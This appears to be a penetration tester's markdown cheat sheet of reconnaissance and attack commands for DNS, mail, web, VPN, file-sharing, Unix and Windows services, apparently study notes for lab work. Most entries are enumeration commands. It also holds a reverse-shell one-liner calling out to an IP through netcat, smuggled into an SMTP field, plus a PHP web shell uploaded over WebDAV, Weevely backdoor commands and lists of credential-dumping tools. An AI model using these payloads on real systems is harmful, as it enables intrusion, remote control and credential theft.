## Active

### Port Scanning
- Nmap
	- Autonmap
		- `./autonmap.sh -n $OUTPUT_NAME -t $IP`
		- `https://github.com/cthulhu897/autonmap`

- Protocols
	- More Information
		- `cat /usr/share/nmap/nmap-protocols`

- Services
	- More Information
		-  `cat /usr/share/nmap/nmap-services`

### DNS
- DNS Resource Records
	- Address of Host (A) = IPv4
	- Address of Host (AAAA) = IPv6
	- Canonical Name (CNAME) = Alias
	- Mail Exchange (MX) = Mail Server. Could be hostname or IP Address.
	- Name Server (NS) = Name server for a zone.
	- Start of Authority (SOA) = Primary name server for the zone and more information.
	- Pointer (PTR) = Used for reverse lookups in DNS.
	- Text (TXT) = Extra functionality to DNS and store information.

- DNS Zone File
	- ; = used for comments-
	- @ = Represent the zone origin.
	- Name = Name to map to an address.
	- Record Class = When IN refers to Internet. When CH is CHAOS.
	- Record Type = DNS Resource Recods.
	- Record Data = IP Address or hostname. The first records is the SOA.
	
- DNS Hacking Tools
	- Dig
		- DNS querying tool.
		- *Finding SOA*
		  - `dig $URL SOA`
		  - `dig $PRIMARY_NAME_SERVER`
		- *Digging for Information*
		  - `dig @$NAME_SERVER $DOMAIN_NAME`
		  - `dig @$IP $NAME_SERVER`
		- *Specifying Resource Records*
		  - `dig @$NAME_SERVER $DOMAIN_NAME $RECORD_TYPE`
		- *Information Leak CHAOS*
		  - `dig @$NAME_SERVER chaos $DOMAIN_NAME $RECORD_TYPE`
	- NSlookup
		- DNS querying tool.
		  - `nslookup $URL`
	- DNSrecon
		- Reconnaissance on a name server.
		  - `dnsrecon -n $I -d $DOMAIN`
	- DNSenum
		- Enumerate information.
		  - `dnsenum --dnsserver $IP $NAME_SERVER`
	- Fierce
		- Scaning tool.
		  - `fierce -dnsserver $IP -dns $NAME_SERVER`
	- Host
		- DNS querying tool.
		  - `host $URL`
		  - `host -t mx $URL`
		  - `host -t txt $URL`
		  - `for SUBDOMAIN in $(cat list.txt); do host $SUBDOMAIN.$DOMAIN; done`
		  - `for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"`
	- WHOIS
		- Name of a protocol and DNS querying tool.
		  - `whois $URL`
	- DNSspoof
		- Spoofing DNS Packets tool.
	- Dsniff
		- Sniffing DNS caches and packets.
	- Hping3
		- Creating and injecting custom packets.
	- Scapy
		- Packet injection tool.
	- Nmap
		- Port scanner.
		  - `nmap -sU -p53 $IP`
		  - `nmap -sU --script dns-fuzz --script=-args timelimit=2h $IP -p53`
	- Searchsploit
		- Searching known exploiits tool.
	- MSFConsole
		-  Modular command-line tool.
		  - `use scanner/dns/dns/dns_amp`
	- Wireshark
		- Packet inspection tool.

### Mail
- SMTP
	-  Application Layer Protocol
- SPF
	- Sender Policy Framework
	- Prevent from forging or spoofing
	  - `dig @$IP $SERVER txt`
- Scanning
  - Nmap
	  - `nmap -sT -A -vv -n -Pn $IP -p- -oN $FILE_NAME.txt`
	  - `nv $IP $PORT`
	  - `nmap --script=smtp-* $IP -p25`
- Enumerate Users via Finger
	- NC
		- `nc $IP 79`
		- `admin`
		- `root`

	- Mail Hacking Tools
	- POP3
		- `telnet $IP 110`
		- `USER $USERNAME`
		- `PASS $PASSWORD`
		- `LIST`
		- `RETR 1`

	- SMTP
		- `VRFY root`
		- `VRFY idontexist`
		- `EHLO someone@mydomain`
		- `MAIL FROM: <'@mydomain>`
		- `DATA`
		- `FROM: someone@mydomain`
		- `' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.130 1234 >/tmp/f .`
		- `quit`

### Web Server
- Scanning Web Server
  - Nmap
	  - `nmap -sT -p- -A -vv -n -Pn -oN $FILE_NAME.txt -oX $FILE_NAME.xml $IP`
- Manual HTTP Requests
  - NC
    - `nc $IP 80`
    - `GET / HTTP/1.1`
      - `host: foo`
    - `HEAD / HTTP/1.1`
      - `host: foo`
    - `OPTIONS / HTTP/1.1`
      - `host: foo`
- Web Server Hacking Tools
	- Command-line web tools
		- CURL
		- WGET
	- Content Discovery
		- Gobuster
			- `gobuster dir --wordlist=$WORDLIST -l -t 30 -e -k -x ".html,.asp,.php" -u http://$IP:$PORT -p http://127.0.0.1:8080 -a "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -o Output_Gobuster.txt`
			- `gobuster dir --wordlist=$WORDLIST -l -u http://$IP:$PORT -p http://127.0.0.1:8080 -a "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -o Output_Gobuster.txt`
		 - Dirb
		 	- `dirb $URL -r -z 10`
	- Web Vulnerability CGI Scanning Tools
		- Nikto
			- `nikto -host http://$IP:$PORT -Format htm -output Output_Nikto.html`
	- Web Extension Tools
		- Cadaver for WebDav
			- `cadaver $IP`
			- `<?php system($_GET[cmd]); ?>`
			- `dav:/> put /test.php`
			- `http://$IP:$PORT/test.php?cmd=id`
	- Server-side Scripted Backdoor Tools
		- Weevely
			- `weevely generate $PASSWORD backdoor.php`
			- `weevely http://$IP:$PORT/backdoor.php $PASSWORD`
		- ASP.NET Shell
	- Tunneling
		- Proxychains
	- General Purpose
		- Nmap
			- `nmap -p 80 -vv -n --script=http-enum $IP`
		- Netcat
		- Metasploit
		- Searchsploit
	- Convert XML to HTML
		- XSLTProc
			- `xsltproc $FILE_NAME.xml > $FILE_NAME.html`
- Softwares & Common Vulnerabilities and Exposures
	- Webmin
		- `webmin_show_cgi_exec`
	- Web Proxies
    - Nmap
		  - `nmap --script=http-open-proxy $IP -p3128 -sT -vv -n -Pn`

### Virtual Private Networks
- IPSec
	- Internet Protocol Security
	- Network layer (Layer 3)

- IKE
	- Internet Key Exchange

- TLS
	- Transport Layer Security and VPNs

- VPN Methodology
	- Identify VPN technology
	- Establish communication with the server
	- Identify authtentication method and encryption method
	- Perform "handshake"
	- Identify vulnerabilities for exploitation

- Scanning VPN
	- Hping3
		- `hping3 -S -p $IP`
		- `hping3 --udp -p 500 $IP`
		- `hping3 --udp -p 123 $IP`
	- Nmap
		- `nmap -sU -p500,1194 $IP`

- VPN Hacking Tools
	- IPsec Tools
		- Building IPSec tunnels
	- IKE-scan
		- IKE probing
			- `ike-scan $IP`
			- `ike-scan --trans=1,1,1,1 $IP`
			- `ike-scan -A $IP --pskcrack=pskhash`
	- PSK-crack
		- Cracking PSKs used by IKE
		- `psk-crack paskhash`
	- OpenSSL
		- Client-server tool for SSL/TLS negotiation
	- VPN Clients
		- Application for legitimate users

### Files Transfer
- FTP (Port 21)
	- File Transfer Protocol
	- Attacks:
		- Brute-force password
		- Anonymous browsing
		- Exploitation of software defects
		- Authenticated exploitation of vulnerabilities
		- Hydra ✔️

- FTPS (Port 990)
	- File Transfer Protocol
	- Attacks:
		- Hydra ✔️

- TFTP (Port 69)
	- Trivial File Transfer Protocol
	- Attacks:
		- Obtain material from the server (config files)
		- Bypass controls to overwrite data (replace ROM image)
		- Execute code via overflow or memory corrumption

- SMB
	- Server Message Block

- NFS
	- Network File System

- NetBIOS
	- SMB can run using NetBIOS
	- Netbios over TCP/IP (NBT) protocol

- Files Transfer Hacking Tools
	- FTP
    - Creds
		  - `anonymous:anonymous`
	- TFTP
    - TFTP
		  - `tftp $IP`
	- NetBios
		- NBTScan
			- `nbtscan -v $IP`
	- SMB
		- Enum4Linux
			- `enum4linux -a $IP`
		- Nbt Scan
			- `nbtscan -r $IP/24`
				
		- Nmblookup
			- `nmblookup -A $IP`

		- Smbmap
			- `smbmap -u $USER -p $PASSWORD -R -H $IP`

		- Smbclient
			- `smbclient -L $IP`

		- RpcClient

			- `rpcclient -U "" -N $IP`
			- `> enumdomusers`

		- Nmap NSE Scripts
			- `ls -1 /usr/share/nmap/scripts/smb*`
			- `nmap -v -p 139, 445 --script=smb-os-discovery $IP`

	- Mount
		- `mount -t cifs -o vers=1.0,user=guest \\\\$IP\\data /mnt/data`
		- `mount -t cifs -o vers=1.0,user=employee1 \\\\$IP\\data /mnt/data`
		
	- NFS
		- Show Mount
			- `mount -o nolock $IP:/home ~/home/`
			- `showmount -e $IP`
			- `sudo adduser pwn`

		- Nmap NSE Script
			- `ls -1 /usr/share/nmap/scripts/nfs*`
			- `nmap -sV -p 111 --script=rpcinfo $IP`
			- `nmap -p 111 --script nfs* $IP`

### Databases
- Database Methodology
	- Find access to the database and data it holds
	- Enumerate schema and learn structure
	- Access database and search useful information
	- Attempt to gain database administrator roghts (DBA)
	- Attempt access the OS and its file
	- Attempt to exploit UDFs to run code
	- Attempt escape the database, attack OS, and escalate privileges

### Unix
- Telnet (Port 23)
	- Attacks:
		- Brute-force password
		- Anonymous exploitation of Telnet server software flaws
		- Hydra ✔️

- SSH (Port 22)
	- Secure Shell
	- Attacks:
		- Brute-force password
		- Access with private key exposure
		- Access with key generation weakness
		- Remote anonymous exploitation of known flaws (without creds)
		- Authenticated exploitation of known defects (privilege escalation)
		- Hydra ✔️
	
- RPC (Port 111)
	- Remote Procedure Calls
	
- SNMP (Port 161)
	- Simple Network Management Protocol
	- Attacks:
		- User enumeration via SNMPv3
		- Brute-force of community strings and user password values
		- Exposing information through reading SNMP data (low priv)
		- Exploitation through writing SNMP data (high priv)
		- Exploitation of software implementation flaws (privileged rce)
		- Hydra ✔️

- X11
	- X Windows System

- Unix Hacking Tools
	- Telnet
		- `telnet -l -fbin $IP`

	- Finger

	- Cron

	- RPC
		- RPCinfo
			- `rpcinfo`
		- RPCclient
	
	- X Windows
		- Nmap
			- `nmap --script=x11-access $IP -p6000`
		- Xwd
			- `xwd -root -screen -silent -display $IP:0 >screenshot.xwd`
		- Xdotool
		- Xwininfo
			- `xwininfo -tree -root -display $IP:0`
		- Xspy

	- SNMP
		- Snmpcheck
			- `snmp-check -c public -v1 $IP`
		- Onesixtyone
			- `echo public > community`
			- `echo private >> community`
			- `echo manager >> community`
			- `for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips`
			- `onesixtyone -c community -i ips`

		- Snmpwalk
			- MIB Tree
				- `snmpwalk -c public -v1 -t 10 $IP`

			- Users
				- `snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.2`

			- Processes
				- `snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2`

			- TCP Ports
				- `snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3`

			- Software
				- `snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2`

		- SNMP MIB Values
			- 1.3.6.1.2.1.25.4.2.1.4 Processes Path
			- 1.3.6.1.2.1.25.2.3.1.4 Storage Units
			- 1.3.6.1.2.1.25.6.3.1.2 Software Name
			- 1.3.6.1.4.1.77.1.2.25 User Accounts
			- 1.3.6.1.2.1.6.13.1.3 TCP Local Ports
			- 1.3.6.1.2.1.25.1.6.0 System Processes
			- 1.3.6.1.2.1.25.4.2.1.2 Running Programs

### Windows

- LDAP
	- Light Directory Access Protocol
	- Attacks:
		- Information leak via anonymous binding
		- Brute-force password
		- Authenticated modification of data within the LDAP directory
		- Exploitation of LDAP server software defects
		- Hydra ✔️
	- `ldapsearch`

- LDAPS
	- Hydra ✔️

- RDP
	- `xfreerdp /u:$USER /p:$PASSWORD/v:$IP /cert-ignore`

- Windows Hacking Tools
	- Enumeration tools
		- Enum4linux
		- Enum.exe
		- RIDenum
	- Domain Mapping Tools
		- BloodHound
	- Windows Shell Tools
		- PowerSpoloit
		- Powertools
		- P0wnedshell
		- Empire
	- .NET applications
		- Sharpsploit
		- Covenant
	- Password hash dumping tools
		- Mimikatz
		- PwDumoX14
		- Fgdump
		- Shad0w-dump
		- SAMdump2
		- Cain and Abel
	- Post-exploit tools
		- Meterpreter
		- Empire
